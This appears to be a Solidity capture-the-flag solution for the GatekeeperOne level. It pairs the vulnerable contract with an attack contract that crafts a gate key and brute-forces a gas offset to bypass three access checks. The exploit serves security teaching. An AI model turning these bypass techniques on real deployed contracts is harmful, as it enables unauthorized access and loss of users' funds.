// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract AttackGateKeeper {

    GatekeeperOne toAttack;
    bytes8 gateKey = 0x00000001000004bb;
    uint public solution;

    constructor(address _levelInstance) public {
        toAttack = GatekeeperOne(_levelInstance);
    }

    function validateGateKey(bytes8 _gateKey) public view returns (bool isValid) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
      return true;
    }

    function getGasOffset() public {
      for (uint i = 0; i < 200; i ++) {
        (bool success,) = address(toAttack).call{gas: 81910 + i + 200}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (success) {
          solution = i;
          break;
        }
      }
    }

    function attack() public {
      (bool success,) = address(toAttack).call{gas: 81910 + 254}(abi.encodeWithSignature("enter(bytes8)", gateKey));
      require(success);
    }

    function getSolution() public view returns (uint) {
      return solution;
    }

}
